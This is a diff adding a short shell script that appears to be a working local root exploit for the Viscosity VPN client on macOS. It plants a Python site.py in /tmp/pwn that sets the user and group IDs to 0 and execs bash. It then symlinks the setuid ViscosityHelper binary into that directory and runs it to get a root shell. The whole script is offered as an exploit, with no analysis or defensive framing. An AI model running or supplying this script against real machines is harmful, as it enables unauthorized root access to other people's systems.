@@ -1,0 +1,12 @@
+#!/bin/sh
+# Greets to zx2c4
+mkdir -p -v /tmp/pwn
+cat > /tmp/pwn/site.py <<_EOF
+import os
+os.system("rm -rvf /tmp/pwn")
+os.setuid(0)
+os.setgid(0)
+os.execl("/bin/bash", "bash")
+_EOF
+ln -s -f -v /Applications/Viscosity.app/Contents/Resources/ViscosityHelper /tmp/pwn/root
+exec /tmp/pwn/root
